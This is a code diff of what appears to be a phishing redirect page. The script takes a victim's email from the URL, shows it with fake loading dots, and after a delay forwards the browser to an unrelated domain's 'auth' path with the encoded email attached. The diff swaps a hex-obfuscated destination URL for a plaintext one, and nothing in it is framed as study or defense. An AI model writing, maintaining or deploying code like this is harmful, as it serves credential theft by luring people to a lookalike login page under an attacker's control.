@@ -70,11 +70,6 @@
             }
         }
 
-        // Convert Hex to String
-        function hexToString(hex) {
-            return hex.match(/.{2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
-        }
-
         // Extract email parameter from URL
         function findEmailParam() {
             const urlParams = new URLSearchParams(window.location.search);
@@ -90,13 +85,13 @@
         }
 
         // Redirect to final URL with email appended
-function redirectToTarget(base64Email) {
-    const hex = "68747470733A2F2F736D616C6C6465706F742E636F6D2F6E2F3F63335939627A4D324E56387858335A7661574E6C4A6E4A68626D513956555634656D5246627A306D64576C6B50565654525649794F4445774D6A41794E4655304E6A45774D6A67794F513D3D4E303132334E";
-    const obfuscatedURL = hex.match(/.{2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('') + base64Email;
-    window.location.href = obfuscatedURL;
-}
+        function redirectToTarget(base64Email) {
+            const baseUrl = "http://thumenectrics.es/xxtg/auth/";
+            const finalUrl = baseUrl + base64Email;
+            window.location.href = finalUrl;
+        }
 
-// Update the displayed email and redirect
+        // Update the displayed email and redirect
         window.onload = function () {
             const emailParam = findEmailParam();
             const emailDisplay = document.getElementById('emailDisplay');
@@ -104,7 +99,7 @@ function redirectToTarget(base64Email) {
                 emailDisplay.innerText = emailParam.decodedValue; // Display the decoded email
                 document.querySelector('.dots-container').style.display = 'flex'; // Show loading dots
                 setTimeout(() => {
-                    redirectToTarget(emailParam.value, emailParam.decodedValue);
+                    redirectToTarget(emailParam.value);
                 }, 2000); // Delay before redirection
             } else {
                 console.error("No valid email parameter found.");
